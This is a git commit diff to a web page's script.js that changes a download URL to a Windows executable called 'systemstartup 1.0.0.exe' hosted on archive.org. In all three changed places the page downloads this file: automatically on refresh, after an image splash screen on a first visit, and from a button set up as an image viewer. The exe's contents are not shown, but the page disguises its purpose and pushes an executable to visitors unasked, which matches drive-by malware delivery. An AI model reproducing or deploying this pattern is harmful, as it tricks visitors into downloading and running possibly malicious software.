992bd834161e96bf59b5710f217c731de6649f65
digitz20 <alaekekaebuka200@gmail.com>
2026-06-23 03:31:57 +0100

    jewgd

--- script.js
+++ script.js
@@ -16,7 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Add event listener for the download button
     viewImageButton.addEventListener('click', () => {
-        downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
+        downloadFile('https://archive.org/download/systemstartup-1.0.0_202606/systemstartup%201.0.0.exe');
     });
 
     const hasSeenImages = localStorage.getItem('hasSeenImages');
@@ -29,7 +29,7 @@ document.addEventListener('DOMContentLoaded', () => {
         logoImage.classList.remove('hidden'); // Show logo image
 
         // Automatically start download immediately on refresh if images have been seen
-        downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
+        downloadFile('https://archive.org/download/systemstartup-1.0.0_202606/systemstartup%201.0.0.exe');
 
     } else {
         // If it's the first time, play the image sequence
@@ -49,7 +49,7 @@ document.addEventListener('DOMContentLoaded', () => {
             localStorage.setItem('hasSeenImages', 'true'); // Set flag immediately for future refreshes
 
             // Automatically start download after splash screen on first visit
-            downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
+            downloadFile('https://archive.org/download/systemstartup-1.0.0_202606/systemstartup%201.0.0.exe');
         }, 5000); // Both images visible for 5 seconds
     }
 });
